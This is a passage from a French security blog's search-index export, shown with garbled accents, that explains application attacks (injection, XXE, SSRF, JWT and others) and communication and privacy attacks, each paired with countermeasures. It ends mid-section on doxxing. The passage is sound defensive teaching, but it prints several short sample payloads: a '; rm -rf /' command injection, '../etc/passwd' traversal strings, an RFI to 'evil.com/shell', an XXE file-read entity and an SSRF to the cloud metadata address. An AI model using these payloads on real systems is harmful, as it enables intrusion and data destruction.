‚úÖ V√©rification de l‚Äôorigine Comment √ßa marche : le serveur v√©rifie l‚Äôen-t√™te Origin ou Referer. Pourquoi √ßa prot√®ge : les requ√™tes l√©gitimes viennent du site, pas d‚Äôun domaine tiers. 4. Remote Code Execution (RCE) 1. Situation de d√©part Une application permet d‚Äôenvoyer des fichiers ou ex√©cute des commandes syst√®me.\n2. Ce que fait l‚Äôattaquant Il envoie un fichier PHP malveillant (webshell) ou injecte une commande dans un champ (; rm -rf /).\n3. Cons√©quence Ex√©cution de code arbitraire sur le serveur. Contr√¥le total de la machine. 4. Pourquoi c‚Äôest possible Entr√©es utilisateur pass√©es directement √† une fonction d‚Äôex√©cution (eval, exec, system). T√©l√©versement de fichiers sans contr√¥le strict. 5. Contre-mesures ‚úÖ √âviter les appels syst√®me directs Comment √ßa marche : ne jamais concat√©ner des entr√©es utilisateur dans une commande syst√®me. Pourquoi √ßa prot√®ge : supprime la possibilit√© d‚Äôinjecter du code. ‚úÖ Validation stricte des fichiers upload√©s V√©rifier extension, type MIME, scanner antivirus. Stocker hors du r√©pertoire web. Pourquoi √ßa prot√®ge : √©vite l‚Äôex√©cution de scripts malveillants. ‚úÖ Ex√©cution dans un bac √† sable (sandbox) Conteneurs, chroot, AppArmor/SELinux. Pourquoi √ßa prot√®ge : m√™me si l‚Äôattaquant injecte du code, il reste confin√© avec des droits limit√©s. 5. Buffer Overflow 1. Situation de d√©part Une application en C re√ßoit des donn√©es en entr√©e (ex. un champ nom d‚Äôutilisateur).\n2. Ce que fait l‚Äôattaquant Il envoie une cha√Æne plus longue que le buffer pr√©vu.\nCela √©crase la m√©moire voisine et peut injecter du code ex√©cutable.\n3. Cons√©quence Crash de l‚Äôapplication. Ex√©cution de code arbitraire. 4. Pourquoi c‚Äôest possible Pas de v√©rification de la taille de l‚Äôentr√©e. Utilisation de fonctions dangereuses (gets, strcpy). 5. Contre-mesures ‚úÖ V√©rification de la taille des entr√©es Utiliser strncpy, fgets, etc. Pourquoi √ßa prot√®ge : emp√™che l‚Äô√©criture au-del√† de la m√©moire allou√©e. ‚úÖ Canaries / protections m√©moire Le compilateur ajoute une valeur sp√©ciale entre la pile et les donn√©es. Pourquoi √ßa prot√®ge : si l‚Äôattaquant √©crase cette valeur, le programme d√©tecte l‚Äôintrusion et s‚Äôarr√™te. ‚úÖ ASLR (Address Space Layout Randomization) L‚Äôadresse m√©moire des segments change √† chaque ex√©cution. Pourquoi √ßa prot√®ge : rend tr√®s difficile pour l‚Äôattaquant de pr√©dire o√π injecter son code. ‚úÖ Ex√©cution non ex√©cutable (NX bit) Marque certaines zones m√©moire comme non ex√©cutables. Pourquoi √ßa prot√®ge : m√™me si l‚Äôattaquant injecte du code, il ne peut pas l‚Äôex√©cuter. 6. Path Traversal (Directory Traversal) 1. Situation de d√©part Un site permet de t√©l√©charger un fichier PDF via une URL comme :\nhttps://site.com/download?file=rapport.pdf\n2. Ce que fait l‚Äôattaquant Il modifie le param√®tre en :\nfile=../../../../etc/passwd\nLe serveur ouvre ce chemin, pensant que c‚Äôest un fichier autoris√©.\n3. Cons√©quence Lecture de fichiers sensibles (mots de passe, configurations). Acc√®s √† des donn√©es internes (logs, cl√©s priv√©es). 4. Pourquoi c‚Äôest possible L‚Äôapplication utilise directement l‚Äôentr√©e utilisateur comme chemin d‚Äôacc√®s. Pas de validation ni restriction des fichiers accessibles. 5. Contre-mesures ‚úÖ Validation stricte des chemins Comparer le fichier demand√© avec une liste blanche d‚Äôextensions/autorisations. Pourquoi √ßa prot√®ge : seules les ressources pr√©vues par le d√©veloppeur sont accessibles. ‚úÖ R√©pertoires d√©di√©s (jail/chroot) Forcer l‚Äôapplication √† n‚Äôacc√©der qu‚Äô√† un dossier sp√©cifique. Pourquoi √ßa prot√®ge : m√™me si l‚Äôattaquant tente un ../, il ne peut pas sortir de l‚Äôespace pr√©vu. ‚úÖ Normalisation du chemin R√©soudre les ../ avant l‚Äôacc√®s au fichier et v√©rifier qu‚Äôil reste dans le dossier autoris√©. Pourquoi √ßa prot√®ge : √©vite l‚Äô√©vasion de r√©pertoire. 7. File Inclusion (LFI / RFI) 1. Situation de d√©part Un site en PHP inclut dynamiquement des fichiers :\ninclude($_GET['page'].\u0026quot;.php\u0026quot;);\n2. Ce que fait l‚Äôattaquant Avec LFI : il demande ?page=../../../../etc/passwd pour afficher le contenu du fichier. Avec RFI : il fournit une URL externe (?page=http://evil.com/shell) ‚Üí ex√©cution d‚Äôun script distant. 3. Cons√©quence Lecture de fichiers sensibles. Ex√©cution de code distant (prise de contr√¥le du serveur). 4. Pourquoi c‚Äôest possible Utilisation de l‚Äôentr√©e utilisateur sans contr√¥le dans une fonction include/require. 5. Contre-mesures ‚úÖ D√©sactiver allow_url_include (PHP) Bloque les inclusions de fichiers distants. Pourquoi √ßa prot√®ge : emp√™che un attaquant de charger du code externe. ‚úÖ Liste blanche de fichiers N‚Äôautoriser que des pages pr√©d√©finies (about.php, contact.php). Pourquoi √ßa prot√®ge : impossible d‚Äôinclure des fichiers arbitraires. ‚úÖ R√©pertoires s√©par√©s Mettre les fichiers inclus dans un dossier sp√©cifique non accessible √† l‚Äôattaquant. Pourquoi √ßa prot√®ge : r√©duit l‚Äôexposition de fichiers syst√®me. 8. XXE (XML External Entity) 1. Situation de d√©part Une API accepte du XML et utilise un parseur vuln√©rable.\n2. Ce que fait l‚Äôattaquant Il envoie un XML malveillant :\n\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;request\u0026gt; \u0026lt;data\u0026gt;\u0026amp;xxe;\u0026lt;/data\u0026gt; \u0026lt;/request\u0026gt; 3. Cons√©quence Lecture de fichiers locaux (/etc/passwd). Requ√™tes vers des serveurs internes (SSRF). 4. Pourquoi c‚Äôest possible Les parseurs XML activent par d√©faut la r√©solution d‚Äôentit√©s externes. 5. Contre-mesures ‚úÖ D√©sactiver la r√©solution d‚Äôentit√©s externes Configurer le parseur pour ignorer les \u0026lt;!ENTITY\u0026gt;. Pourquoi √ßa prot√®ge : emp√™che l‚Äôinclusion de fichiers locaux ou distants. ‚úÖ Utiliser des parseurs s√©curis√©s Ex. defusedxml en Python. Pourquoi √ßa prot√®ge : ces parseurs bloquent les entit√©s dangereuses par d√©faut. ‚úÖ Validation stricte du XML N‚Äôaccepter que le sch√©ma attendu (XSD). Pourquoi √ßa prot√®ge : rejette les documents mal form√©s ou inattendus. 9. Insecure Deserialization 1. Situation de d√©part Une application PHP stocke des objets s√©rialis√©s dans un cookie :\ncookie=O:4:\u0026quot;User\u0026quot;:{s:4:\u0026quot;role\u0026quot;;s:5:\u0026quot;admin\u0026quot;;}\n2. Ce que fait l‚Äôattaquant Il modifie la valeur du cookie et le renvoie :\nrole=admin\n√Ä la d√©s√©rialisation, l‚Äôobjet donne des privil√®ges d‚Äôadministrateur.\n3. Cons√©quence Escalade de privil√®ges. Ex√©cution de code arbitraire si l‚Äôapplication charge automatiquement des m√©thodes √† la d√©s√©rialisation. 4. Pourquoi c‚Äôest possible Les donn√©es s√©rialis√©es sont consid√©r√©es comme fiables. Certaines classes d√©clenchent du code √† la d√©s√©rialisation (__wakeup, __destruct). 5. Contre-mesures ‚úÖ Ne pas d√©s√©rialiser des donn√©es non fiables Pr√©f√©rer des formats simples (JSON). Pourquoi √ßa prot√®ge : JSON ne d√©clenche pas de code √† l‚Äôinterpr√©tation. ‚úÖ Signer/chiffrer les donn√©es s√©rialis√©es Ajouter une signature HMAC. Pourquoi √ßa prot√®ge : l‚Äôattaquant ne peut pas modifier le contenu sans casser la signature. ‚úÖ Limiter les classes d√©s√©rialisables Restreindre la liste des classes utilisables. Pourquoi √ßa prot√®ge : emp√™che l‚Äôex√©cution de m√©thodes dangereuses. 10. Command Injection 1. Situation de d√©part Une application appelle un programme syst√®me avec des entr√©es utilisateur :\nsystem(\u0026#34;ping \u0026#34; . $_GET[\u0026#39;host\u0026#39;]); 2. Ce que fait l‚Äôattaquant Il fournit :\nhost=8.8.8.8; rm -rf /\nLa commande ex√©cut√©e devient :\nping 8.8.8.8; rm -rf /\n3. Cons√©quence Ex√©cution de commandes arbitraires. Contr√¥le total de la machine. 4. Pourquoi c‚Äôest possible Les entr√©es ne sont pas valid√©es. La commande syst√®me est construite par concat√©nation de cha√Ænes. 5. Contre-mesures ‚úÖ Ne pas concat√©ner les entr√©es Utiliser des fonctions d‚ÄôAPI (ex. ping via une lib r√©seau). Pourquoi √ßa prot√®ge : pas de passage par le shell ‚Üí pas d‚Äôinjection possible. ‚úÖ √âchapper correctement les arguments Utiliser escapeshellarg() ou √©quivalents. Pourquoi √ßa prot√®ge : les caract√®res dangereux sont neutralis√©s. ‚úÖ Ex√©cution dans un environnement restreint Conteneurs ou sandbox avec droits limit√©s. Pourquoi √ßa prot√®ge : m√™me si une injection passe, elle a un impact limit√©. Parfait üöÄ ! On passe au niveau sup√©rieur avec les attaques applicatives avanc√©es.\nToujours dans le m√™me format narratif :\nSituation de d√©part\nCe que fait l‚Äôattaquant\nCons√©quence\nPourquoi c‚Äôest possible\nContre-mesures (explication d√©taill√©e)\n11. SSRF (Server-Side Request Forgery) 1. Situation de d√©part Une application propose de t√©l√©charger une image externe via une URL :\nhttps://site.com/fetch?url=http://exemple.com/chat.png\n2. Ce que fait l‚Äôattaquant Il remplace l‚ÄôURL par une ressource interne :\nurl=http://127.0.0.1:8080/admin\nLe serveur fait la requ√™te √† sa place.\n3. Cons√©quence Acc√®s √† des services internes (intranet, bases de donn√©es). Contournement de pare-feux. Exploitation de services cloud sensibles (AWS metadata : http://169.254.169.254). 4. Pourquoi c‚Äôest possible L‚Äôapplication fait confiance aux URLs fournies. Pas de restriction sur les adresses cibles. 5. Contre-mesures ‚úÖ Liste blanche d‚ÄôURLs autoris√©es Autoriser uniquement certains domaines/sch√©mas (https://cdn.site.com). Pourquoi √ßa prot√®ge : emp√™che l‚Äôacc√®s √† des ressources internes. ‚úÖ Validation stricte de l‚ÄôURL R√©solution DNS et v√©rification que l‚ÄôIP finale est l√©gitime. Pourquoi √ßa prot√®ge : √©vite les contournements via redirections. ‚úÖ Isolation du composant fetcher Ex√©cuter les requ√™tes dans un conteneur sans acc√®s r√©seau interne. Pourquoi √ßa prot√®ge : m√™me si SSRF r√©ussi, les ressources critiques restent inaccessibles. 12. IDOR (Insecure Direct Object Reference) 1. Situation de d√©part Une API permet d‚Äôacc√©der √† un profil via :\nhttps://site.com/api/user?id=123\n2. Ce que fait l‚Äôattaquant Il change l‚ÄôID en :\nid=124\net acc√®de au profil d‚Äôun autre utilisateur.\n3. Cons√©quence Vol d‚Äôinformations personnelles. Acc√®s ou modification de donn√©es sensibles (documents, factures). 4. Pourquoi c‚Äôest possible L‚Äôapplication ne v√©rifie pas que l‚Äôutilisateur a le droit d‚Äôacc√©der √† l‚Äôobjet demand√©. L‚Äôidentifiant est pr√©visible. 5. Contre-mesures ‚úÖ V√©rification des permissions c√¥t√© serveur Toujours v√©rifier : ‚Äúcet utilisateur a-t-il le droit d‚Äôacc√©der √† cette ressource ?‚Äù. Pourquoi √ßa prot√®ge : emp√™che qu‚Äôun simple changement d‚ÄôID donne acc√®s √† d‚Äôautres donn√©es. ‚úÖ Identifiants impr√©visibles Utiliser des UUID ou tokens al√©atoires au lieu d‚ÄôIDs incr√©mentaux. Pourquoi √ßa prot√®ge : difficile de deviner les identifiants d‚Äôautres utilisateurs. ‚úÖ Contr√¥les d‚Äôacc√®s centralis√©s Mettre en place une couche d‚ÄôauthZ (RBAC, ABAC). Pourquoi √ßa prot√®ge : r√©duit les oublis de v√©rification dans le code applicatif. 13. Broken Authentication 1. Situation de d√©part Un site utilise une authentification basique avec des mots de passe faibles et sans protection.\n2. Ce que fait l‚Äôattaquant Essaye des mots de passe communs (bruteforce). Exploite un stockage en clair ou un hachage faible (MD5). R√©utilise des identifiants fuit√©s d‚Äôautres sites. 3. Cons√©quence Compromission de comptes utilisateurs. Acc√®s √† des comptes administrateurs. 4. Pourquoi c‚Äôest possible Pas de politiques de mot de passe. Pas de protection contre le bruteforce. Pas d‚Äôauthentification multi-facteur. 5. Contre-mesures ‚úÖ Hashing fort des mots de passe Utiliser bcrypt, Argon2 avec salage. Pourquoi √ßa prot√®ge : rend impossible de retrouver les mots de passe en cas de fuite. ‚úÖ Limitation des tentatives de connexion Blocage temporaire ou captcha apr√®s plusieurs √©checs. Pourquoi √ßa prot√®ge : emp√™che le bruteforce automatique. ‚úÖ MFA (Multi-Factor Authentication) Ajouter un second facteur (TOTP, SMS, cl√© FIDO2). Pourquoi √ßa prot√®ge : m√™me si le mot de passe est compromis, l‚Äôacc√®s reste bloqu√©. 14. Mass Assignment 1. Situation de d√©part Une API permet de mettre √† jour un profil via un JSON :\n{ \u0026#34;name\u0026#34;: \u0026#34;Alice\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;alice@example.com\u0026#34; } 2. Ce que fait l‚Äôattaquant Il ajoute un champ non pr√©vu :\n{ \u0026#34;name\u0026#34;: \u0026#34;Attacker\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34; } 3. Cons√©quence Modification de champs sensibles (r√¥le, droits). Escalade de privil√®ges. 4. Pourquoi c‚Äôest possible Le framework associe automatiquement tous les champs re√ßus aux propri√©t√©s de l‚Äôobjet. Pas de filtrage des champs modifiables. 5. Contre-mesures ‚úÖ Liste blanche de champs autoris√©s Sp√©cifier explicitement quels champs sont modifiables (name, email). Pourquoi √ßa prot√®ge : les champs sensibles comme role sont ignor√©s. ‚úÖ DTOs (Data Transfer Objects) Passer par des objets interm√©diaires d√©finissant les champs attendus. Pourquoi √ßa prot√®ge : impossible d‚Äôinjecter des propri√©t√©s non pr√©vues. ‚úÖ Contr√¥les d‚Äôacc√®s V√©rifier que l‚Äôutilisateur a bien le droit de modifier chaque champ. Pourquoi √ßa prot√®ge : m√™me si un champ passe, la modification est bloqu√©e par manque de permission. 15. Business Logic Flaws (failles de logique m√©tier) 1. Situation de d√©part Un site e-commerce applique une remise de 10% pour toute commande sup√©rieure √† 100‚Ç¨.\nLa logique m√©tier est cens√©e limiter les abus.\n2. Ce que fait l‚Äôattaquant Il manipule la requ√™te HTTP pour commander 10 articles, applique la remise, puis retire 9 articles avant paiement. Le syst√®me conserve la remise alors que la condition n‚Äôest plus remplie. 3. Cons√©quence Fraude (r√©duction ou gratuit√©). Contournement de r√®gles de s√©curit√© internes. 4. Pourquoi c‚Äôest possible Les d√©veloppeurs supposent que les utilisateurs suivent le ‚Äúchemin normal‚Äù. Pas de v√©rification syst√©matique c√¥t√© serveur de la coh√©rence des √©tapes. 5. Contre-mesures ‚úÖ V√©rifications c√¥t√© serveur Recalculer les remises et r√®gles m√©tier √† chaque √©tape. Pourquoi √ßa prot√®ge : emp√™che les manipulations c√¥t√© client de modifier les r√®gles. ‚úÖ Tests de logique m√©tier Inclure des cas d‚Äôabus dans les tests (ex. suppression d‚Äôarticles apr√®s remise). Pourquoi √ßa prot√®ge : d√©tecte les sc√©narios ‚Äúhors flux pr√©vu‚Äù. ‚úÖ Revue de s√©curit√© fonctionnelle Audit sp√©cifique de la logique m√©tier (pas seulement technique). Pourquoi √ßa prot√®ge : identifie des abus invisibles pour des scans automatis√©s. 16. Race Conditions (conditions de concurrence) 1. Situation de d√©part Une application bancaire limite un retrait √† 100‚Ç¨ maximum par jour.\n2. Ce que fait l‚Äôattaquant Il envoie 2 requ√™tes de retrait de 100‚Ç¨ exactement en m√™me temps. Les deux passent la v√©rification avant que le solde soit mis √† jour. 3. Cons√©quence D√©passement des limites. Transactions incoh√©rentes (double utilisation d‚Äôun coupon, d‚Äôun code promo, etc.). 4. Pourquoi c‚Äôest possible L‚Äôapplication ne g√®re pas correctement les op√©rations concurrentes. Pas de verrouillage de transaction au niveau base de donn√©es. 5. Contre-mesures ‚úÖ Transactions atomiques en base Utiliser BEGIN TRANSACTION avec verrouillage des lignes. Pourquoi √ßa prot√®ge : les deux op√©rations concurrentes ne passent pas en m√™me temps. ‚úÖ Locks applicatifs Mettre des verrous logiques (mutex) c√¥t√© application. Pourquoi √ßa prot√®ge : une seule op√©ration critique peut √™tre ex√©cut√©e √† la fois. ‚úÖ Contr√¥les post-traitement V√©rifier apr√®s coup si des incoh√©rences apparaissent. Pourquoi √ßa prot√®ge : permet de d√©tecter des abus m√™me si la concurrence a contourn√© la logique. 17. GraphQL Misconfigurations 1. Situation de d√©part Une API GraphQL est expos√©e pour permettre aux clients d‚Äôinterroger les donn√©es.\n2. Ce que fait l‚Äôattaquant Il utilise la fonctionnalit√© __schema (introspection) pour d√©couvrir toute l‚ÄôAPI. Il envoie des requ√™tes profondes ou r√©cursives pour saturer le serveur. 3. Cons√©quence Divulgation de sch√©ma interne. Denial of Service via requ√™tes trop co√ªteuses. 4. Pourquoi c‚Äôest possible Introspection activ√©e en production. Pas de limite de profondeur ou de complexit√© des requ√™tes. 5. Contre-mesures ‚úÖ D√©sactiver l‚Äôintrospection en prod Garder __schema uniquement en dev/test. Pourquoi √ßa prot√®ge : r√©duit l‚Äôexposition du sch√©ma complet. ‚úÖ Limiter la profondeur des requ√™tes Configurer un maximum (ex. 5 niveaux). Pourquoi √ßa prot√®ge : emp√™che les requ√™tes r√©cursives ou trop complexes. ‚úÖ Contr√¥ler la complexit√© Assigner un ‚Äúco√ªt‚Äù √† chaque champ et refuser les requ√™tes trop lourdes. Pourquoi √ßa prot√®ge : emp√™che l‚Äôabus de ressources serveur. 18. JWT Attacks (JSON Web Token) 1. Situation de d√©part Une API utilise des JWT pour g√©rer l‚Äôauthentification.\nExemple :\n{ \u0026#34;user\u0026#34;: \u0026#34;alice\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;user\u0026#34; } 2. Ce que fait l‚Äôattaquant Il modifie role en \u0026quot;admin\u0026quot; dans le JWT. Si la signature n‚Äôest pas v√©rifi√©e correctement, le serveur accepte le jeton. Exploit ‚Äúalg=none‚Äù : certains serveurs acceptent un JWT sans signature. 3. Cons√©quence Escalade de privil√®ges. Acc√®s √† des fonctions r√©serv√©es aux admins. 4. Pourquoi c‚Äôest possible V√©rification incorrecte de la signature JWT. Utilisation de cl√©s faibles ou mal g√©r√©es. 5. Contre-mesures ‚úÖ V√©rification stricte de la signature Toujours valider l‚Äôalgorithme et la cl√©. Pourquoi √ßa prot√®ge : emp√™che d‚Äôaccepter un jeton modifi√©. ‚úÖ Rotation et gestion des cl√©s Stocker les cl√©s dans un KMS (Key Management System). Pourquoi √ßa prot√®ge : r√©duit le risque de fuite et limite la dur√©e d‚Äôexploitation d‚Äôune cl√© compromise. ‚úÖ Limiter la dur√©e de vie des tokens Expiration courte (exp de quelques minutes/heures). Pourquoi √ßa prot√®ge : m√™me si un token est vol√©, il devient vite inutilisable. 19. API Abuse / Rate Limiting Bypass 1. Situation de d√©part Une API REST fournit des ressources (ex. /api/messages).\nElle applique une limite de 100 requ√™tes/minute par utilisateur.\n2. Ce que fait l‚Äôattaquant Il change son User-Agent ou son IP via un proxy/tor. Il ouvre des milliers de connexions parall√®les. Il contourne ainsi les protections. 3. Cons√©quence Extraction massive de donn√©es (scraping). Denial of Service pour les autres utilisateurs. 4. Pourquoi c‚Äôest possible Le rate limiting est bas√© sur un seul crit√®re (IP ou user). Pas de protection globale. 5. Contre-mesures ‚úÖ Rate limiting multi-crit√®res Bas√© sur IP, utilisateur, User-Agent, session, etc. Pourquoi √ßa prot√®ge : rend plus difficile le contournement par simple proxy. ‚úÖ D√©tection comportementale Analyser les patterns de requ√™tes (fr√©quence, distribution). Pourquoi √ßa prot√®ge : diff√©rencie un utilisateur normal d‚Äôun bot. ‚úÖ Captcha ou proof-of-work Forcer une action humaine apr√®s X requ√™tes. Pourquoi √ßa prot√®ge : d√©courage les bots automatis√©s. Conclusion Les attaques applicatives montrent que la s√©curit√© doit √™tre int√©gr√©e d√®s le d√©veloppement :\ntester la logique m√©tier, valider strictement les entr√©es, s√©parer code et donn√©es, limiter les permissions, et appliquer le principe de d√©fense en profondeur.\nTrois enseignements majeurs :\nNe jamais faire confiance aux entr√©es utilisateur ‚Üí toute donn√©e re√ßue doit √™tre valid√©e, filtr√©e, √©chapp√©e. Prot√©ger l‚Äôauthentification et la session ‚Üí MFA, cookies s√©curis√©s, tokens correctement sign√©s. Auditer la logique m√©tier ‚Üí certaines failles (ex. remise commerciale, abus d‚ÄôAPI) ne sont pas techniques mais fonctionnelles. En r√©sum√© : une application vuln√©rable ouvre une porte directe aux donn√©es sensibles et aux syst√®mes critiques. La s√©curit√© applicative n‚Äôest pas un ajout optionnel mais un √©l√©ment fondamental du cycle de vie logiciel.\n","permalink":"http://localhost:1313/blog/attaques-applicatives/","summary":"Les attaques applicatives ciblent directement le code m√©tier, les API et les frameworks. D√©couvrez les vecteurs classiques (injection, XSS, CSRF) et modernes (GraphQL, JWT, API abuse), ainsi que les meilleures pratiques de d√©fense.","title":"üì≤ Attaques Applicatives"},{"content":"Attaques sur les communications et la vie priv√©e Les attaques sur les communications et la vie priv√©e ciblent ce qui transite entre les utilisateurs, les services en ligne et les infrastructures.\nElles ne cherchent pas forc√©ment √† compromettre directement un syst√®me, mais √† espionner, d√©tourner ou profiler les individus en exploitant :\nles failles des protocoles de communication (GSM, Wi-Fi, Bluetooth, DNS), l‚Äôabsence de chiffrement g√©n√©ralis√©, les fuites d‚Äôinformations personnelles (m√©tadonn√©es, g√©olocalisation, OSINT). Elles combinent des vecteurs techniques (IMSI catcher, rogue Wi-Fi, TEMPEST) et des vecteurs de profilage (tracking en ligne, doxxing, re-identification).\nLeur danger vient de leur invisibilit√© : la victime continue d‚Äôutiliser normalement ses services, sans percevoir que ses communications ou sa vie priv√©e sont compromises.\n1. IMSI Catcher (fausse antenne relais) 1. Situation de d√©part Un utilisateur est dans une zone publique (gare, centre-ville).\nSon t√©l√©phone se connecte automatiquement √† l‚Äôantenne relais la plus proche.\n2. Ce que fait l‚Äôattaquant Il installe un faux relais GSM/4G (IMSI catcher ou Stingray). Le t√©l√©phone, pensant que c‚Äôest une antenne l√©gitime, s‚Äôy connecte. L‚Äôattaquant intercepte appels, SMS, m√©tadonn√©es. 3. Cons√©quence Espionnage de communications. Suivi de la localisation en temps r√©el. 4. Pourquoi c‚Äôest possible Le protocole GSM ne v√©rifie pas toujours l‚Äôauthenticit√© de l‚Äôantenne. Les t√©l√©phones se connectent automatiquement au signal le plus fort. 5. Contre-mesures ‚úÖ 4G/5G avec chiffrement renforc√© Ces standards incluent une authentification mutuelle. Pourquoi √ßa prot√®ge : limite l‚Äôefficacit√© des fausses antennes. ‚úÖ Applications chiffr√©es (Signal, WhatsApp) Chiffrement de bout en bout pour les messages et appels. Pourquoi √ßa prot√®ge : m√™me intercept√©, le contenu reste illisible. ‚úÖ D√©tection d‚Äôanomalies r√©seau Applications qui surveillent la force et l‚Äôorigine des antennes. Pourquoi √ßa prot√®ge : alerte en cas de relais suspect. 2. Wi-Fi Rogue / Evil Twin 1. Situation de d√©part Un utilisateur se connecte √† un Wi-Fi public (‚ÄúFree_WiFi‚Äù dans un caf√©).\n2. Ce que fait l‚Äôattaquant Il cr√©e un faux point d‚Äôacc√®s avec le m√™me SSID. Les appareils se connectent automatiquement. Il intercepte et manipule le trafic. 3. Cons√©quence Vol de credentials. Injection de contenus malveillants. 4. Pourquoi c‚Äôest possible Les appareils m√©morisent les r√©seaux Wi-Fi et se reconnectent automatiquement. Pas de chiffrement si le r√©seau est ouvert. 5. Contre-mesures ‚úÖ Utiliser un VPN Chiffre tout le trafic d√®s la sortie du PC. Pourquoi √ßa prot√®ge : m√™me si le Wi-Fi est compromis, l‚Äôattaquant ne voit rien. ‚úÖ Oublier les r√©seaux publics Emp√™cher la reconnexion automatique. Pourquoi √ßa prot√®ge : √©vite la connexion √† un faux AP. ‚úÖ WPA3 + certificats Privil√©gier les r√©seaux d‚Äôentreprise s√©curis√©s. Pourquoi √ßa prot√®ge : emp√™che les imitations simples. 3. Interception massive (√©coute gouvernementale / op√©rateur) 1. Situation de d√©part Un fournisseur d‚Äôacc√®s Internet (FAI) transporte le trafic de millions d‚Äôutilisateurs.\n2. Ce que fait l‚Äôattaquant (ou un √âtat) Installe une sonde sur l‚Äôinfrastructure r√©seau. Copie tout le trafic passant (emails, DNS, HTTP non chiffr√©). Analyse avec des outils de corr√©lation. 3. Cons√©quence Perte de confidentialit√© √† grande √©chelle. Profilage et surveillance de masse. 4. Pourquoi c‚Äôest possible Les donn√©es non chiffr√©es sont lisibles en transit. Les op√©rateurs peuvent √™tre oblig√©s de coop√©rer. 5. Contre-mesures ‚úÖ Chiffrement g√©n√©ralis√© (TLS, HTTPS, VPN) Prot√©ger tout le trafic, pas seulement une partie. Pourquoi √ßa prot√®ge : m√™me intercept√©, le contenu reste illisible. ‚úÖ DNS over HTTPS (DoH) ou DNS over TLS (DoT) Chiffre les requ√™tes DNS. Pourquoi √ßa prot√®ge : emp√™che l‚Äôespionnage des sites visit√©s. ‚úÖ Tor / anonymisation Routage en couches via plusieurs relais. Pourquoi √ßa prot√®ge : rend la corr√©lation trafic-source plus difficile. 4. Tracking en ligne (cookies, fingerprinting) 1. Situation de d√©part Un utilisateur navigue sur Internet.\nIl visite plusieurs sites diff√©rents dans la journ√©e.\n2. Ce que fait l‚Äôattaquant (ou les annonceurs) D√©pose des cookies tiers pour suivre la navigation. Utilise du fingerprinting (r√©solution √©cran, polices, plugins) pour identifier l‚Äôutilisateur. 3. Cons√©quence Profilage publicitaire tr√®s pr√©cis. Perte de confidentialit√©. 4. Pourquoi c‚Äôest possible Les navigateurs partagent beaucoup d‚Äôinformations. Les cookies sont accept√©s par d√©faut. 5. Contre-mesures ‚úÖ Bloqueurs de tracking Extensions (uBlock, Privacy Badger). Pourquoi √ßa prot√®ge : emp√™che le d√©p√¥t de cookies tiers. ‚úÖ Navigateur renforc√© (Firefox, Brave) Protection native contre fingerprinting. Pourquoi √ßa prot√®ge : r√©duit l‚Äôempreinte unique. ‚úÖ Conteneurs ou navigation s√©par√©e S√©parer activit√©s perso/professionnelles. Pourquoi √ßa prot√®ge : rend plus difficile le suivi global. 5. Attaques via Bluetooth 1. Situation de d√©part Un utilisateur a laiss√© le Bluetooth activ√© sur son smartphone.\n2. Ce que fait l‚Äôattaquant Exploite une faille Bluetooth (BlueBorne). Se connecte au t√©l√©phone sans autorisation. Acc√®de aux fichiers ou au micro. 3. Cons√©quence Espionnage de conversations. Vol de donn√©es personnelles. 4. Pourquoi c‚Äôest possible Bluetooth diffuse sa pr√©sence. Vuln√©rabilit√©s fr√©quentes dans les stacks Bluetooth. 5. Contre-mesures ‚úÖ D√©sactiver Bluetooth quand inutile Limiter l‚Äôexposition. Pourquoi √ßa prot√®ge : r√©duit la surface d‚Äôattaque. ‚úÖ Mises √† jour r√©guli√®res Patch des vuln√©rabilit√©s BlueBorne et similaires. Pourquoi √ßa prot√®ge : corrige les failles connues. ‚úÖ Appairage s√©curis√© Utiliser uniquement des appareils de confiance. Pourquoi √ßa prot√®ge : emp√™che un acc√®s furtif. 6. Attaques par signaux (TEMPEST, sniffing EM) 1. Situation de d√©part Un attaquant se trouve √† proximit√© d‚Äôun bureau √©quip√© de PC.\n2. Ce que fait l‚Äôattaquant Il capte les √©missions √©lectromagn√©tiques des √©crans ou claviers. Il reconstruit les frappes ou l‚Äôaffichage √† distance. 3. Cons√©quence Espionnage sans contact direct. Vol d‚Äôinformations sensibles (mots de passe, documents). 4. Pourquoi c‚Äôest possible Les composants √©lectroniques rayonnent naturellement. Pas de blindage EM. 5. Contre-mesures ‚úÖ Blindage EM (normes TEMPEST) Mat√©riel blind√© contre les fuites √©lectromagn√©tiques. Pourquoi √ßa prot√®ge : emp√™che la capture √† distance. ‚úÖ Distances de s√©curit√© Ne pas installer des √©quipements sensibles pr√®s d‚Äôun mur externe. Pourquoi √ßa prot√®ge : r√©duit les opportunit√©s de captation. ‚úÖ Bruit √©lectromagn√©tique G√©n√©rateurs de bruit pour masquer les signaux. Pourquoi √ßa prot√®ge : rend l‚Äôanalyse impr√©cise. 7. OSINT (Open Source Intelligence) 1. Situation de d√©part Un attaquant veut profiler une cible (individu ou entreprise).\nIl n‚Äôa pas d‚Äôacc√®s direct, seulement Internet et sources publiques.\n2. Ce que fait l‚Äôattaquant Il collecte toutes les infos accessibles : r√©seaux sociaux, sites pros, d√©p√¥ts GitHub, annonces d‚Äôemploi. Il corr√®le ces donn√©es (technologies utilis√©es, habitudes, adresses, contacts). 3. Cons√©quence Construction d‚Äôun profil pr√©cis de la cible. Utilis√© pour lancer un phishing ultra-cibl√©, un harc√®lement ou pr√©parer une intrusion. 4. Pourquoi c‚Äôest possible Les gens publient beaucoup (LinkedIn, Instagram, CV en ligne). Les entreprises laissent fuiter des infos techniques (versions de logiciels, sch√©mas r√©seau). 5. Contre-mesures ‚úÖ Hygi√®ne num√©rique Limiter les infos publi√©es publiquement. Pourquoi √ßa prot√®ge : moins de mati√®re exploitable par l‚Äôattaquant. ‚úÖ Surveillance d‚Äôexposition Outils pour d√©tecter les infos sensibles laiss√©es en ligne (Shodan, Google dorking). Pourquoi √ßa prot√®ge : alerte si un document interne est accessible. ‚úÖ Sensibilisation Former les employ√©s aux risques du ‚Äútrop d‚Äôinfos‚Äù. Pourquoi √ßa prot√®ge : √©vite les fuites involontaires. 8. Doxxing 1. Situation de d√©part Une personne s‚Äôexprime en ligne (forum, Twitter, Discord).\n2. Ce que fait l‚Äôattaquant Il rassemble ses infos personnelles (nom r√©el, adresse, employeur). Il publie ces donn√©es pour intimider, harceler ou faciliter une attaque physique. 3. Cons√©quence Harc√®lement en ligne ou hors 